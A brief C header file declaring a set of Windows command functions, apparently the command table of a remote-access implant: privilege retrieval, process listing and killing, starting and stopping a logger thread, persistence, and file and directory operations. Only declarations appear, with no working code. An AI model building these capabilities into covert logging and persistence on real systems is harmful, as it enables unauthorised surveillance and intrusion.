#pragma once

BOOL pwd(CHAR* input, CHAR** output);
BOOL getprivs(CHAR* input, CHAR** output);
BOOL kill(CHAR* input, CHAR** output);
BOOL stoplogg(CHAR* input, CHAR** output);
BOOL startlogg(CHAR* input, CHAR** output);
BOOL persist(CHAR* input, CHAR** output);
BOOL pslist(CHAR* input, CHAR** output);
BOOL change_directory(CHAR* input, CHAR** output);
DWORD WINAPI logg(LPVOID lpParam);
BOOL move_file(const char* source_path, const char* dest_path, char** output);